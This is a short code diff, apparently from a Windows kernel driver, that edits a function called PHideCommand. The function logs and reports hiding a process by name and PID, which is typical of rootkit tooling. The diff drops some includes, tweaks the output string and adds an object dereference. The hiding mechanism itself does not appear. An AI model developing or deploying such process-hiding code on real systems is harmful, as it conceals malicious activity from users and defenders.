@@ -1,6 +1,3 @@
-#include <ntifs.h>
-#include <ntstrsafe.h>
-#include "dbgmsg.h"
 #include "IOCTLRoutines.h"
 
 void PingCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inBufferLen, ULONG outBufferLen)
@@ -56,7 +53,8 @@ void PHideCommand(PVOID inputBuffer, PVOID outputBuffer, ULONG inBufferLen, ULON
 		DBG_TRACE("Image File Name", imageFileName);
 		DBG_PRINT3("[PHideCommand] Hid process %s, PID: %u", imageFileName, pId);
 	
-		RtlStringCbPrintfA((NTSTRSAFE_PSTR) outputBuffer, outBufferLen, "Hid process %s, PID: %u", imageFileName, pId);
+		RtlStringCbPrintfA((NTSTRSAFE_PSTR) outputBuffer, outBufferLen, "Hid process %s, PID %u", imageFileName, pId);
+		ObDereferenceObject(proc);
 	}
 
 	return;
